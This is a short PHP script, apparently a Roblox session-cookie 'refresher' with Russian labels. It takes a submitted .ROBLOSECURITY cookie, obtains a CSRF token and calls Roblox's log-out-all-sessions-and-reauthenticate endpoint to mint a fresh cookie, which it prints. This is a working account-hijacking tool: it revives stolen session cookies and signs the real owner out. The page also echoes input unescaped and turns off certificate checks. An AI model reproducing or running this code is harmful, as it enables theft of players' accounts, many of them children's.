<?php

$form = '<form action="" method="post">
        <input type="text" name="cookie" placeholder="Enter: ">
        <input type="submit">
        </form>';

echo $form;

if($_SERVER['REQUEST_METHOD'] == 'POST') {
    $cookie = $_POST['cookie'];

    echo '<div style="width: 70vw; overflow-wrap: anywhere;">';
    echo '<p> Мёртвая кука </p>';
    echo $cookie;
    echo '</div>';
    
    if(!(stripos($cookie, "_|WARNING:-DO-NOT-SHARE-THIS") === false)) {

        $curl = curl_init('https://auth.roblox.com/');
        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_HEADER, true);
        curl_setopt($curl, CURLOPT_COOKIE, '.ROBLOSECURITY='.$cookie);
        $out = curl_exec($curl);

        $cs = preg_match('|(?<=x-csrf-token:\s)[^\s]+|', $out, $matches);

        $data = array(
            'X-CSRF-TOKEN: ' . $matches[0]
        );
        
        $curl = curl_init('https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate');
        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_HTTPHEADER, $data);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_HEADER, true);
        curl_setopt($curl, CURLOPT_COOKIE, '.ROBLOSECURITY='.$cookie);

        $out = curl_exec($curl);
        $newCook = preg_match('|(?<=ROBLOSECURITY=)[^;]+|', $out, $matches);

        if($newCook) {
            echo '<div style="width: 70vw; overflow-wrap: anywhere;">';
            echo '<p> Живая кука </p>';
            echo $matches[0];
            echo '</div>';
        } else {
            echo '<p> Кука невалид </p>';
        };        
    }
}